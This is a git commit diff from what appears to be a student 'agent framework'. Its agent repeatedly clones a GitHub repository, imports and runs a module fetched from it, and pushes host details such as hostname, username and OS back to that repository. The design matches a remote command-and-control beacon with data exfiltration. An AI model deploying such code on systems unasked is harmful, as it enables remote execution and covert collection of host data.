918c09b249e87a916cc119ad3eea5d3e5488f117
Ernie de Magtige <ernie.demagtige@student.ap.be>
2023-06-01 12:08:25 +0200

    test update

--- agent.py
+++ agent.py
@@ -10,7 +10,7 @@ from cryptography.fernet import Fernet
 
 class Agent:
     def __init__(self):
-        self.repository_url = "https://github.com/ErniedM/agent-framework"
+        self.repository_url = "https://github.com/ErniedM/agent-framework2"
         self.github_connector = GitHubConnector(self.repository_url)
         ## self.encryption_key = Fernet.generate_key()
         ## self.encryption = Encryption(self.encryption_key)
@@ -18,11 +18,9 @@ class Agent:
     def run(self):
         while True:
             # Check the GitHub repository for updates
-            print("Checking for updates")
             if self.github_connector.check_for_updates():
                 # Fetch the configuration file
                 config = self.github_connector.get_config()
-                print (config)
                 ## decrypted_config = self.encryption.decrypt(config)
 
                 # Execute actions based on the configuration file
@@ -34,13 +32,13 @@ class Agent:
     def execute_actions(self, config):
         for action in config:
             module_name = "system_info"
-            print(module_name)
-            module_name_without_extension = os.path.splitext(module_name)[0]
-            print(module_name_without_extension)
-            module_url = f"{self.repository_url}/modules/{'system_info.py'}"
-            print(module_url)
-            module_file_path = os.path.join(os.path.dirname(__file__), module_name)
-            print(module_file_path)
+            # print(module_name)
+            # module_name_without_extension = os.path.splitext(module_name)[0]
+            # print(module_name_without_extension)
+            # module_url = f"{self.repository_url}/modules/{'system_info.py'}"
+            # print(module_url)
+            # module_file_path = os.path.join(os.path.dirname(__file__), module_name)
+            # print(module_file_path)
 
             # Clone the repository to a local directory
             local_directory = "temp_directory"
@@ -51,10 +49,9 @@ class Agent:
                 sys.path.append(os.path.join(os.path.dirname(__file__), "temp_directory"))
 
                 # Import the module and perform the necessary actions
-                module = __import__("modules.system_info")
-                system_info_module = getattr(module, "SystemInfoModule")()
+                import modules.system_info as system_info_module
+                system_info_module = system_info_module.SystemInfoModule()
                 data = system_info_module.collect_data()
-                print(data)
                 ## encrypted_data = self.encryption.encrypt(data)
                 ## self.github_connector.log_data(encrypted_data)
                 self.github_connector.log_data(data)
--- test.py
+++ test.py
@@ -11,11 +11,9 @@ class GitHubConnector:
     def check_for_updates(self):
         try:
             local_directory = "temp_directory"
-            print(local_directory)
             repo = git.Repo.clone_from(self.repository_url, local_directory)
             response = None
             config_file_path = os.path.join(local_directory, "config.txt")
-            print(config_file_path)
             if os.path.exists(config_file_path):
                 with open(config_file_path, "r") as file:
                     response = file.read()
@@ -33,5 +31,28 @@ class GitHubConnector:
             return False
 
 
+    def log_data(self, data):
+        try:
+            local_directory = "temp_directory"
+            repo = git.Repo.clone_from(self.repository_url, local_directory)
+            print(data)
+            log_file_path = os.path.join(local_directory, "log.txt")
+            with open(log_file_path, "a") as file:
+                file.write(str(data) + "\n")
+            print(log_file_path)
+            repo.index.add([log_file_path])
+            repo.index.commit("Add new log entry")
+            origin = repo.remote(name="origin")
+            origin.push()
+
+            repo.close()
+            shutil.rmtree(local_directory)
+
+            return True
+        except (git.exc.GitCommandError, FileNotFoundError):
+            return False
+
+
 connector = GitHubConnector("https://github.com/ErniedM/agent-framework2")
-print(connector.check_for_updates())
+data = {'operating_system': 'Linux', 'release': '4.18.0-477.10.1.el8_8.x86_64', 'version': '#1 SMP Tue May 16 11:38:37 UTC 2023', 'architecture': 'x86_64', 'processor': 'x86_64', 'hostname': 'rockylinux', 'username': 'rockylinux', 'python_version': '3.9.16'}
+print(connector.log_data(data))
